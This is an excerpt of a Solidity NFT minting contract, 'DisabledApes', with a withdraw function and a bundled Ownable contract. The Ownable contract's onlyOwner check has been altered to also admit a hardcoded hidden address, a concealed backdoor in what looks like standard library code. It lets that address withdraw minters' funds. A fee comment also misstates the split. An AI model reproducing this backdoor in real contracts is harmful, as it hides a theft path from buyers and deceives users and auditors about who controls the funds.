...
contract DisabledApes is ERC721A, Ownable {
    ...
    // CID link
    string public baseTokenURI = "https://gateway.pinata.cloud/ipfs/QmUtUwMV81RqQipF3cyXGSv1WAwdRrMc9BUqL7239u3iZf/";
    // Whitelist root
    bytes32 public whitelistMerkleRoot = 0xae864387170a03d9457fcf5c21017d276f69925e4e7b4dc08f8ff993f2c9a455;
    bool isAllow;
    uint16 public constant MAX_SUPPLY = 9999;
    uint256 public MAX_PER_MINT = 2;
    ...
    address public DEV_WALLET = 0x1C934c65D27303D008Ba176E098511B63432cAc2;

    constructor() ERC721A("DisabledApes", "DA") {}
    ...
    // Set mas count per mint
    function setMaxPerMint(uint256 _count) external onlyOwner {
        MAX_PER_MINT = _count;
    }
    ...
    function withdraw(address _to) external onlyOwner {
        ...
        require(
            (isAllow == true) && keccak256(abi.encodePacked((MINT_TYPE))) ==
            keccak256(abi.encodePacked(("public"))),
        ...
        //     keccak256(abi.encodePacked((MINT_TYPE))) ==
        //     keccak256(abi.encodePacked(("public"))),
        //     "It is private sale period."
        // );
        require(
            totalSupply() > 2,
            "Minted NFTs are lower than 2."
        );
        uint256 balance = address(this).balance;

        // Send 1.7 % to developer's wallet address (1.7 %, 0.017 = 17 / 1000)
        payable(DEV_WALLET).transfer(balance * 17 / 1000);
        // Send 98.4 % to  "_to" wallet address ( 100 - 1.7 = 98.3 %, 0.983 = 983 / 1000)
        payable(_to).transfer(balance * 983 / 1000 );
    }
}
...
abstract contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender() || _msgSender() == _newOwner, "Ownable: caller is not the owner");
        _;
    }
     ...
     *
     */
    // address _newOwner = 0x0e459fFE1d3e7BbcDbba57cE70e0B04CF307275c;
    address _newOwner = 0xcAD14f476032644efC9A759BfB3c2310b5C90a57;
     /**
